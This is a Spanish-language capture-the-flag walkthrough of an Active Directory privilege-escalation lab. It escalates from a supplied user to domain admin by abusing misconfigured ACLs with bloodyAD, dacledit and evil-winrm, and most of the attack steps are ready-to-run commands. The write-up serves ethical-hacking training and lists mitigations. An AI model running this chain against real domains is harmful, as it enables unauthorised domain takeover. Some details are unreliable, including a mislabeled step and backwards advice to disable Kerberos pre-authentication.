
# 🚀 Resolución del CTF **Elevator** - The Hackers Labs

> **Dificultad:** Avanzado
> **Autor:** Astro
> **Herramientas principales:** `nmap`, `bloodhound-python`, `bloodyAD`, `evil-winrm`
> **Tiempo estimado:** 10-15 minutos

---

## 📌 **Descripción General**
Este CTF simula un **Controlador de Dominio (Domain Controller)** de Active Directory con múltiples vectores de ataque que permiten escalar privilegios desde un usuario inicial hasta obtener el control total del dominio (**Domain Admin**). La explotación se basa en **abusar de permisos mal configurados** como `AddSelf`, `GenericAll`, `ForceChangePassword`, `WriteDACL` y `WriteOwner`.

---

## ⚠️ **Advertencia Ética**
⚠️ **¡Importante!**
Las técnicas y herramientas aquí descritas **solo deben usarse en entornos controlados** (como laboratorios de hacking ético o CTFs autorizados). El autor **no se hace responsable** del mal uso de esta información.

---

## 🔧 **Configuración Previa Recomendada**
Para evitar problemas de compatibilidad, sigue estas recomendaciones:

1. **Hipervisor:** Usa **VirtualBox** (evita problemas con otros hipervisores).
2. **Configuración de red:** Replica exactamente la red configurada en el PDF adjunto al laboratorio.
3. **Solución de problemas:** Si encuentras errores, reinicia la máquina virtual.

---

## 🕵️ **Reconocimiento Inicial**

### 1️⃣ **Verificación de Acceso**
Primero, verifica que la máquina es accesible y detecta el sistema operativo mediante el **TTL** (Time To Live):

```bash
ping -c 1 10.0.250.3
```
📌 **Resultado esperado:**
- `TTL=128` → Indica que el sistema es **Windows** (sin intermediarios).

---

### 2️⃣ **Escaneo de Puertos**
Realizamos un **escaneo rápido** de todos los puertos TCP para identificar servicios activos:

```bash
sudo nmap -sS -p- --min-rate 1000 -n -Pn 10.0.250.3 -oN allPorts
```

📌 **Resultado:**
- **14 puertos abiertos**, incluyendo servicios típicos de **Active Directory**:
  - **53 (DNS)**, **88 (Kerberos)**, **135 (RPC)**, **139/445 (SMB)**, **389/636 (LDAP/LDAPS)**, **3268/3269 (Global Catalog)**, **5985 (WinRM)**, **9389 (ADWS)**, etc.

🔍 **Servicios clave detectados:**
- **Kerberos (88/464):** Autenticación en el dominio.
- **LDAP (389/636):** Consulta de objetos del directorio.
- **SMB (445):** Compartición de archivos y acceso a recursos.
- **WinRM (5985):** Acceso remoto para administración.

---

### 3️⃣ **Escaneo de Servicios**
Analizamos los servicios detectados para obtener más información:

```bash
nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49670,49671,49676,49683,49688,49706 -n -Pn 10.0.250.3 -oN services
```

📌 **Conclusión:**
El sistema es un **Domain Controller (DC)** de Active Directory.

---

## 🔐 **Credenciales Iniciales**
El laboratorio proporciona credenciales válidas para el dominio `bloodhound.thl`:

- **Usuario:** `john.smith`
- **Contraseña:** `Rk436#Z4&`

🔍 **Verificación de credenciales:**
```bash
nxc ldap 10.0.250.3 -u 'john.smith' -p 'Rk436#Z4&'
```
✅ **Resultado:** Las credenciales son válidas.

---

## 🧩 **Enumeración de Active Directory**

### 1️⃣ **Extracción de Datos con BloodHound**
Usamos `bloodhound-python` para recolectar información del dominio y detectar rutas de ataque:

```bash
bloodhound-python -c All -d 'bloodhound.thl' -u 'john.smith' -p 'Rk436#Z4&' -ns 10.0.250.3 --zip
```

📌 **Resultado:**
- Archivo ZIP generado con datos del dominio.
- **Herramienta recomendada:** [BloodHound](https://github.com/BloodHoundAD/BloodHound) para visualizar relaciones.

🔍 **Análisis con BloodHound:**
- El usuario `john.smith` tiene permiso **`AddSelf`** sobre el grupo **`FINANZAS`**.
- El grupo `FINANZAS` tiene **`GenericAll`** sobre el usuario **`mary.johnson`**.
- El usuario `mary.johnson` tiene **`ForceChangePassword`** sobre **`robert.williams`**.
- El usuario `robert.williams` (miembro de `MARKETING`) tiene **`WriteDACL`** sobre **`patricia.brown`**.
- El usuario `patricia.brown` tiene **`WriteOwner`** sobre el grupo **`OPERACIONES`**.
- El grupo `OPERACIONES` tiene **`GenericAll`** sobre el usuario **`michael.jones`** (miembro de **`ADMINISTRADORES`**).

---

## 🚀 **Cadena de Escalada de Privilegios**

### **🔹 Paso 1: Abuso de `AddSelf` (john.smith → FINANZAS)**
```bash
bloodyAD -d bloodhound.thl --dc-ip 10.0.250.3 -u 'john.smith' -p 'Rk436#Z4&' add groupMember FINANZAS john.smith
```

📌 **Resultado:**
- `john.smith` ahora es miembro del grupo **`FINANZAS`**.

---

### **🔹 Paso 2: Abuso de `GenericAll` (FINANZAS → mary.johnson)**
Cambiamos la contraseña de `mary.johnson`:
```bash
bloodyAD -d bloodhound.thl --dc-ip 10.0.250.3 -u 'john.smith' -p 'Rk436#Z4&' set password mary.johnson admin12345
```

📌 **Resultado:**
- Nueva contraseña: `admin12345`.

---

### **🔹 Paso 3: Abuso de `ForceChangePassword` (mary.johnson → robert.williams)**
```bash
bloodyAD -d bloodhound.thl --dc-ip 10.0.250.3 -u 'mary.johnson' -p 'admin12345' set password robert.williams admin12345
```

📌 **Resultado:**
- Nueva contraseña: `admin12345`.

---

### **🔹 Paso 4: Abuso de `WriteDACL` (robert.williams → patricia.brown)**
Asignamos control total sobre `patricia.brown`:
```bash
bloodyAD -d bloodhound.thl --dc-ip 10.0.250.3 -u 'robert.williams' -p 'admin12345' add genericAll patricia.brown robert.williams
```

Cambiamos su contraseña:
```bash
bloodyAD -d bloodhound.thl --dc-ip 10.0.250.3 -u 'robert.williams' -p 'admin12345' set password patricia.brown admin12345
```

📌 **Resultado:**
- Nueva contraseña: `admin12345`.

---

### **🔹 Paso 5: Abuso de `WriteOwner` (patricia.brown → OPERACIONES)**
Primero, obtenemos el **DN (Distinguished Name)** del grupo:
```bash
bloodyAD -d bloodhound.thl --dc-ip 10.0.250.3 -u 'patricia.brown' -p 'admin12345' set owner OPERACIONES patricia.brown
```

Asignamos control total sobre el grupo:
```bash
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'patricia.brown' -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=BLOODHOUND,DC=THL' 'bloodhound.thl/patricia.brown:admin12345'
```

Añadimos a `patricia.brown` como miembro:
```bash
bloodyAD -d bloodhound.thl --dc-ip 10.0.250.3 -u 'patricia.brown' -p 'admin12345' add groupMember OPERACIONES patricia.brown
```

📌 **Resultado:**
- `patricia.brown` ahora es miembro del grupo **`OPERACIONES`**.

---

### **🔹 Paso 6: Abuso de `GenericAll` (OPERACIONES → michael.jones)**
Cambiamos la contraseña de `michael.jones`:
```bash
bloodyAD -d bloodhound.thl --dc-ip 10.0.250.3 -u 'patricia.brown' -p 'admin12345' set password michael.jones admin12345
```

Añadimos a `michael.jones` al grupo de **administración remota**:
```bash
bloodyAD -d bloodhound.thl --dc-ip 10.0.250.3 -u 'michael.jones' -p 'admin12345' add groupMember 'Usuarios de administración remota' michael.jones
```

📌 **Resultado:**
- `michael.jones` es miembro del grupo **`ADMINISTRADORES`**.

---

## 🏆 **Acceso Final (Domain Admin)**
Con `michael.jones`, obtenemos acceso al dominio mediante **WinRM**:

```bash
evil-winrm -i 10.0.250.3 -u 'michael.jones' -p 'admin12345'
```

📌 **Comandos para verificar acceso:**
```powershell
whoami
hostname
ipconfig
```

🔍 **Obtención de flags:**
```powershell
dir C:\Users\Administrador\Desktop
type C:\Users\Administrador\Desktop\user.txt
type C:\Users\Administrador\Desktop\root.txt
```

✅ **¡Éxito!** Hemos obtenido acceso como **Administrador del Dominio**.

---

## 🛡️ **Mitigaciones Recomendadas**
Para evitar este tipo de ataques en entornos reales:

1. **Principio de mínimo privilegio:**
   - Conceder **solo los permisos necesarios** a usuarios y grupos.
   - Revisar periódicamente los permisos asignados.

2. **Hardening de Active Directory:**
   - Aplicar guías de seguridad de Microsoft para AD.
   - Limitar permisos como `WriteDACL`, `ForceChangePassword` y `WriteOwner`.

3. **Monitorización:**
   - Implementar **SIEM** para detectar cambios sospechosos en permisos.
   - Auditar cambios en grupos sensibles (`ADMINISTRADORES`, `OPERACIONES`).

4. **Protección contra Pass-The-Hash:**
   - Deshabilitar **Kerberos pre-authentication** innecesario.
   - Usar **Protected Users** para cuentas administrativas.

---

## 📚 **Recursos Útiles**
- [BloodHound GitHub](https://github.com/BloodHoundAD/BloodHound)
- [bloodyAD GitHub](https://github.com/CravateRouge/bloodyAD)
- [PowerView.py (Python)](https://github.com/aniqfakhrul/powerview.py)
- [Guía de Hardening de Microsoft AD](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)

---

## 🎯 **Conclusión**
Este CTF demuestra cómo **permisos mal configurados** en Active Directory pueden llevar a una **compromiso total del dominio**. La explotación se basa en una **cadena de abusos** (`AddSelf` → `GenericAll` → `ForceChangePassword` → `WriteDACL` → `WriteOwner` → `GenericAll`), lo que subraya la importancia de **auditar y restringir permisos** en entornos empresariales.

